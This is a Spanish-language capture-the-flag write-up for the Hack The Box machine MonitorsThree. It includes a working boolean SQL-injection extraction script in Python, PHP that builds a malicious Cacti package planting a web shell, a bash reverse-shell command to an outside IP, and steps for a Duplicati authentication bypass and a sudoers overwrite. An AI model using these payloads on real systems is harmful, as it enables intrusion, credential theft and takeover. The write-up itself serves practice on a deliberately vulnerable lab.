#ctf-machine #hackthebox #medium-machine #linux 

![[MonitorsThree.png]]

## Enumeración inicial
Primeramente empezaremos lanzando una traza ICMP a la máquina víctima con `ping` para detectar probablemente su sistema operativo:
![[Pasted image 20240826182525.png]]

Dado que su TTL es cercano a 64, podemos decir que probablemente se trate de un sistema Linux ya que suelen tener ese valor de TTL.

### Nmap
Lanzamos un primer escaneo con `nmap` para detectar los puertos TCP abiertos de la máquina:
![[Pasted image 20240826182724.png]]

Como vemos solo hay 3 puertos abiertos, el puerto 22, 80 y 8000. Por lo que para cada uno de estos puertos abiertos vamos a lanzar un segundo escaneo con `nmap` para detectar la versión y servicio que están ejecutando:
![[Pasted image 20240826183100.png]]

Como vemos se trata de un sistema Linux, ya que se están ejecutando los servicios "OpenSSH 8.9p1" de Ubuntu por el puerto 22 y el servicio "nginx 1.18.0" por el puerto 80.

Además, si nos fijamos vemos que el puerto 80 nos redirige a "monitorsthree.htb" por lo que debemos incluirlo en nuestro `/etc/hosts` para que resuelva en la IPv4 de la máquina víctima:
![[Pasted image 20240826183404.png]]

Hacemos un tercer y último escaneo con `nmap` utilizando el *script* "http-enum" para descubrir algunos archivos y directorios de los puertos 80 y 8000:
![[Pasted image 20240826183758.png]]

Como vemos existe un `login.php` por lo que ya sabemos que la web interpreta en principio código PHP. 

## Enumeración web
Si lanzamos un `whatweb` bajo el puerto 80, vemos información parecida a la que nos ha mostrado `nmap`:
![[Pasted image 20240826183718.png]]

Y si accedemos a la web vemos la siguiente página principal:
![[Pasted image 20240826183918.png]]

Si le pulsamos al botón de "Login", accedemos al archivo `/login.php` que habíamos descubierto anteriormente con `nmap`:
![[Pasted image 20240826191652.png]]

Como no tenemos credenciales no podemos iniciar sesión.

## SQL Injection
Si le damos a "Forgot password?", accedemos a la página `forgot_password.php` en la cual podemos indicar un *username* para recuperar la contraseña. Si probamos con "test", vemos que da error:
![[Pasted image 20240826191924.png]]

Pero si probamos con "test' or '1'='1" nos funciona:
![[Pasted image 20240826192115.png]]

Por lo que podemos realizar una *SQL Injection* booleana.

> [!NOTE] Para realizarla he montado un *script* manual en Python que se puede ver en: [[#SQLi Python Script]]

Primeramente, extraemos las bases de datos:
![[Pasted image 20240826201135.png]]

Como vemos solo hay una aparte de la "information_schema" llamada "monitorsthree_db" por lo que pasamos a enumerar sus tablas:
![[Pasted image 20240826202127.png]]

Como vemos hay 6 tablas por lo que empezamos extrayendo las columnas de la tabla "users" que es la más interesante:
![[Pasted image 20240826214929.png]]

Como podemos ver hay 3 columnas interesantes, las columnas "username", "password" y "email" por lo que extraemos la información de dichas columnas:
![[Pasted image 20240826230133.png]]
> [!NOTE] No he extraído todos los usuarios debido al mal rendimiento de la máquina.😢

Como vemos tenemos unas credenciales que parecen estar encriptadas, pero que sí utilizamos `hashcat` nos dice que puede estar encriptado en estos modos:
![[Pasted image 20240826221733.png]]

Así que si probamos con "md5" con el *hash* del usuario "admin":
![[Pasted image 20240826221811.png]]

Si intentamos acceder en el panel de "login" de antes con estas credenciales, obtenemos acceso:
![[Pasted image 20240826223422.png]]

Se trata de un sistema de monitorización por lo que si accedemos a "Users" podemos ver los usuarios de la base de datos:
![[Pasted image 20240826223502.png]]

Y si accedemos a "Customers" podemos ver un listado grande tambien de la propia base de datos:
![[Pasted image 20240826223537.png]]

## RCE
Aún así, tras investigar por un rato, no tenemos ninguna vía para conseguir RCE por lo que hacemos un escaneo en busca de subdominios de la web encontramos el siguiente:
![[Pasted image 20240826194238.png]]

Así que lo añadimos al `/etc/hosts` para que resuelva en la máquina víctima:
![[Pasted image 20240826194325.png]]

Accedemos al subdominio y vemos lo siguiente:
![[Pasted image 20240826222637.png]]

Se trata de Cacti que si buscamos sobre él veremos en la siguiente página que tiene una vulnerabilidad de RCE por lo que si obtenemos acceso podremos ejecutar comandos en la máquina víctima:
https://github.com/Cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88

Probamos con la credencial que hemos *crackeado*:
![[Pasted image 20240826223012.png]]
Como vemos, hemos obtenido acceso. 

Por lo que si leemos la web que nos muestra como obtener RCE vemos que mediante el módulo de importar *packages* podemos subir un *package* que nos permita ejecutar comandos con PHP. Este código PHP permite crear un *package* malicioso:
```php
<?php

$xmldata = "<xml>
   <files>
       <file>
           <name>resource/test.php</name>
           <data>%s</data>
           <filesignature>%s</filesignature>
       </file>
   </files>
   <publickey>%s</publickey>
   <signature></signature>
</xml>";
$filedata = "<?php system(\$_GET['cmd']); ?>";
$keypair = openssl_pkey_new(); 
$public_key = openssl_pkey_get_details($keypair)["key"]; 
openssl_sign($filedata, $filesignature, $keypair, OPENSSL_ALGO_SHA256);
$data = sprintf($xmldata, base64_encode($filedata), base64_encode($filesignature), base64_encode($public_key));
openssl_sign($data, $signature, $keypair, OPENSSL_ALGO_SHA256);
file_put_contents("test.xml", str_replace("<signature></signature>", "<signature>".base64_encode($signature)."</signature>", $data));
system("cat test.xml | gzip -9 > test.xml.gz; rm test.xml");

?>
```

Por lo que si lo ejecutamos, se crea un archivo "test.xml.gz":
![[Pasted image 20240826225002.png]]

Que si subimos mediante el módulo de *import packages*:
![[Pasted image 20240826225108.png]]

Y accedemos a `/cacti/resource/test.php`, tenemos una *web shell*:
![[Pasted image 20240826225218.png]]

Por lo que si ejecutamos este comando con el parametro "cmd" de la *web shell* obtenemos una *reverse shell*:
```bash
bash -c "bash -i >& /dev/tcp/10.10.14.204/443 0>&1"
```

Siempre y cuando nos pongamos en escucha con `nc` por el puerto 443:
![[Pasted image 20240826225511.png]]

Para podernos manejarnos con la *reverse shell* de forma cómoda hacemos el tratamiento de la TTY:
![[Pasted image 20240826225647.png]]
![[Pasted image 20240826225732.png]]


## Escalada de privilegios
Una vez como el usuario "www-data" podemos acceder a `/var/www/app/admin` para listar las credenciales de la base de datos que están dentro del archivo "db.php" y así poder enumerar la base de datos más fácilmente:
![[Pasted image 20240826230342.png]]

Accedemos a MySQL con este comando:
![[Pasted image 20240826230503.png]]

Y listar los usuarios, contraseñas y emails:
![[Pasted image 20240826230816.png]]

Como vemos "Marcus" es el administrador por lo que si listamos los usuarios del sistema, vemos que existe el usuario "marcus".
![[Pasted image 20240826231006.png]]

Pero no podemos reutilizar la credencial.

Si accedemos a `/var/www/html/cacti/include` podemos ver el archivo "config.php" que contiene las credenciales de la base de datos:
![[Pasted image 20240827000432.png]]

Que podemos reutilizar para conectarnos de nuevo a MySQL:
![[Pasted image 20240827000500.png]]

Como vemos hay una nueva base de datos:
![[Pasted image 20240827000524.png]]

Por lo que si listamos sus tablas vemos una interesante:
![[Pasted image 20240827000557.png]]

Por lo que si mostramos su contenido vemos unos *hashes*:
![[Pasted image 20240827000704.png]]

Como el usuario que nos interesa es "marcu"s podemos intentar *crackear* su contraseña con `hashcat`:
![[Pasted image 20240827000828.png]]

Como vemos `hashcat` nos dice que se trata seguramente de un "bycrypt" por lo que podemos probar *crackearla* con ese modo junto al diccionario "rockyou.txt":
![[Pasted image 20240827001222.png]]

Podemos probar de migrar ahora el usuario "marcus" con estas credenciales:
![[Pasted image 20240827001628.png]]

Y como vemos, es posible. Así que podemos visualizar la primera *flag* en `/home/marcus`:
![[Pasted image 20240827132555.png]]

Si accedemos a `/opt/` vemos un archivo "docker-compose.yml" con este contenido:
![[Pasted image 20240827102749.png]]

Como vemos se trata de un contenedor con imagen "duplicati", donde se está montando la raíz del sistema en la carpeta `/source` del contenedor y se está haciendo además *port forwarding* para que el puerto 8200 del contenedor sea el puerto 8200 de la máquina víctima.

Si hacemos un `netstat -nat` vemos que el puerto 8200 esta abierto por lo que seguramente el contenedor esté corriendo:
![[Pasted image 20240827103627.png]]

Así que subimos `chisel` a la máquina víctima para crear un port forwarding y tener acceso al puerto interno de la máquina víctima desde nuestra máquina. Hacemos que el puerto 8200 de nuestra máquina sea el puerto 8084 de la máquina víctima:
![[Pasted image 20240827104122.png]]
![[Pasted image 20240827104109.png]]

Por lo que si hacemos un escaneo del puerto con `nmap` vemos que se trata de una web:
![[Pasted image 20240827104240.png]]

Si accedemos vemos que necesitamos una contraseña:
![[Pasted image 20240827105729.png]]

Por lo que podemos investigar la configuración de "duplicati" que se encuentra en `/opt/duplicati/config` de la máquina víctima:
![[Pasted image 20240827105851.png]]

Como vemos hay diversos archivos SQLite por lo que podemos investigarlos (únicamente "Duplicati-server.sqlite" y "CTADPHHLTC.sqlite" ya que son los que tenemos permisos). Así que nos lo descargamos en nuestra máquina víctima.

> [!NOTE] Para hacer *bypass* de la contraseña he seguido este recurso: https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee

Si accedemos a "Duplicati-server.sqlite" con `sqlite3` y mostramos las tablas, vemos que hay una llamada "Option". Así que si mostramos su contenido vemos lo siguiente:
![[Pasted image 20240827111210.png]]

Como vemos, hay dos "passphrase" que están en base 64. 

Si observamos que valor nos da de "server-passphrase-salt", vemos que es el mismo:
![[Pasted image 20240827113045.png]]

Así que podemos crear una contraseña válida. Primeramente, convertimos el "server-passphrase" a hexadecimal:
![[Pasted image 20240827113632.png]]

Una vez creado, debemos de capturar el valor de "Nonce":
![[Pasted image 20240827121909.png]]
 
Una vez tenemos este valor debemos de ejecutar esto en la consola de *firefox* para obtener un valor de *password* correcto:
![[Pasted image 20240827122024.png]]

Donde el primer valor es el "Nonce" recibido y el segundo valor es el "server-passpharse" en hexadecimal.

Si mostramos su valor obtenemos:
![[Pasted image 20240827122135.png]]

Este valor debemos introducirlo en el parámetro "password" en *URL-encode* utilizando `burpsuite`:
![[Pasted image 20240827122253.png]]

Y como vemos obtenemos acceso en la web:
![[Pasted image 20240827122321.png]]

Ahora solo debemos crear un nuevo *backup*:
![[Pasted image 20240827122401.png]]

Selecionamos "No Encryption":
![[Pasted image 20240827131303.png]]

El *backup* lo guardamos en `/source/tmp` del contenedor que corresponde a `/tmp` de la máquina víctima:
![[Pasted image 20240827122606.png]]

Seleccionamos el archivo `/source/tmp/etc/sudoers` que corresponde al "sudoers" malicioso que he creado en la máquina víctima:
![[Pasted image 20240827131420.png]]

En este archivo "sudoers" he añadido que el usuario "marcus" pueda ejecutar cualquier comando con "sudo".
![[Pasted image 20240827132724.png]]

Estas opciones las dejamos por defecto:
![[Pasted image 20240827122758.png]]

Y seleccionamos finalmente "Save":
![[Pasted image 20240827131451.png]]

Una vez creado el *backup*, seleccionamos "Restore files":
![[Pasted image 20240827131523.png]]

Seguidamente seleccionamos nuestro "sudoers" malicioso:
![[Pasted image 20240827131550.png]]

Y lo guardamos en `/source/etc` que es el equivalente a al `/etc` de la máquina víctima:
![[Pasted image 20240827131702.png]]

Por lo que sobrescribirá el "sudoers" de la máquina víctima:
![[Pasted image 20240827131745.png]]

Y si mostramos los permisos del usuario "marcus" a nivel de *sudoers* en la máquina víctima ahora vemos:
![[Pasted image 20240827132243.png]]

Por lo que si ejecutamos `sudo bash` obtenemos una "bash" como *root*:
![[Pasted image 20240827132355.png]]

Por lo que finalmente podemos visualizar la última *flag* que se encuentra en `/root`:
![[Pasted image 20240827132439.png]]



## SQLi Python Script
```python
import sys, signal, requests, string, argparse, re
from pwn import *
from termcolor import colored

# Variables globales
URL = "http://monitorsthree.htb/forgot_password.php"
FILTER = "Successfully sent password reset request!"

def sig_handler(sig, frame):
    print(colored("\n[!] Saliendo...\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, sig_handler)


def get_arguments():
    parser = argparse.ArgumentParser(description="SQL Injection - MonitorsThree")
    parser.add_argument("-d", "--database", required=False, dest="database", help="Indica la base de datos")
    parser.add_argument("-t", "--table", required=False, dest="table", help="Indica la tabla de la base de datos")
    parser.add_argument("-c", "--columns", required=False, dest="columns", help="Indica las columnas a extraer de la base de datos")
    args = parser.parse_args()
    return args.database, args.table, args.columns


def get_databases():
    global URL
    global FILTER
    characters = string.printable
    
    p1 = log.progress("Iniciando fuerza bruta para extraer bases de datos")
    p1.status("")
    p2 = log.progress("Probando carácteres")
    info = ""

    for pos in range(1, 500):
        found = False
        for char in characters:
            p2.status(char)
            data = {"username" : f"test' or (select substring(group_concat(schema_name),{pos},1) from information_schema.schemata where schema_name != 'information_schema') = '{char}"}
            r = requests.post(URL, data=data)
            
            if FILTER in r.content.decode():
                info += char
                p1.status(info)
                break

def get_tables(database):
    global URL
    global FILTER
    characters = string.printable
    
    p1 = log.progress(f"Iniciando fuerza bruta para extraer las tablas de {database}")
    p1.status("")
    p2 = log.progress("Probando carácteres")
    info = ""

    for pos in range(1, 500):
        found = False
        for char in characters:
            p2.status(char)
            data = {"username" : f"test' or (select substring(group_concat(table_name),{pos},1) from information_schema.tables where table_schema = '{database}') = '{char}"}
            r = requests.post(URL, data=data)
            
            if FILTER in r.content.decode():
                info += char
                p1.status(info)
                break

def get_columns(database, table):
    global URL
    global FILTER
    characters = string.printable
    
    p1 = log.progress(f"Iniciando fuerza bruta para extraer las columnas de la tabla {database}.{table}")
    p1.status("")
    p2 = log.progress("Probando carácteres")
    info = ""

    for pos in range(1, 500):
        found = False
        for char in characters:
            p2.status(char)
            data = {"username" : f"test' or (select substring(group_concat(column_name),{pos},1) from information_schema.columns where table_schema = '{database}' and table_name = '{table}') = '{char}"}
            r = requests.post(URL, data=data)
            
            if FILTER in r.content.decode():
                info += char
                p1.status(info)
                break

def get_data(database, table, columns):
    global URL
    global FILTER
    characters = string.printable
    
    p1 = log.progress(f"Iniciando fuerza bruta para extraer las columnas {columns}")
    p1.status("")
    p2 = log.progress("Probando carácteres")
    info = ""
    count = 1
    col = str(re.sub(",", ",0x3a,", columns))
    p3 = log.progress(str(count) + ": ")

    for pos in range(1, 500):
        found = False
        for char in characters:
            p2.status(char)
            data = {"username" : f"test' or (select ascii(substring(group_concat({col}),{pos},1)) from {database}.{table}) = '{ord(char)}"}
            r = requests.post(URL, data=data)
            
            if FILTER in r.content.decode():
                
                if char == ',':
                    count += 1
                    p3 = log.progress(str(count) + ": ")
                    info = ""
                    break
                elif char == ':':
                    info += ' '
                    break

                info += char
                p3.status(info)
                break


def main():
    database, table, columns = get_arguments()
    
    if database == None:
        get_databases()

    elif database != None and table == None:
        get_tables(str(database))
    
    elif database != None and table != None and columns == None:
        get_columns(str(database), str(table))
    else:
        get_data(str(database), str(table), str(columns))

if __name__ == '__main__':
    main()
```

___
#sqli #abusing-internal-services #hash-cracking #web-enumeration 
___
